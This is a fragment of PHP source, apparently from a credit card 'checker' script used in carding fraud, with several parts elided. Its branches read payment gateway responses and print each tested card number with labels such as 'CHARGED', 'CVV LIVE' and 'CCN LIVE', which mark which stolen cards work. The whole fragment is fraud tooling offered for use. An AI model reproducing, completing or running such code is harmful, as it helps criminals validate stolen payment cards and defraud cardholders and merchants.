...
elseif(strpos($result2, "succeeded")) {
    ...
    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅𝙐𝙡𝙩𝙧𝙖'.$ip.' </span><br>';
exit;
}

elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅𝙐𝙡𝙩𝙧𝙖'.$ip.'  </span><br>';
    exit;
    }
...
elseif(strpos($result2, 'security code is incorrect.')) {
    ...
    echo '#CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅𝙐𝙡𝙩𝙧𝙖'.$ip.'  </span><br>';
    exit;
    }
...
elseif(strpos($result2, "Membership Confirmation")) {
    ...
    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result: Membership Confirmation '.$amt.' ✅𝙐𝙡𝙩𝙧𝙖'.$ip.' </span><br>';
exit;
}
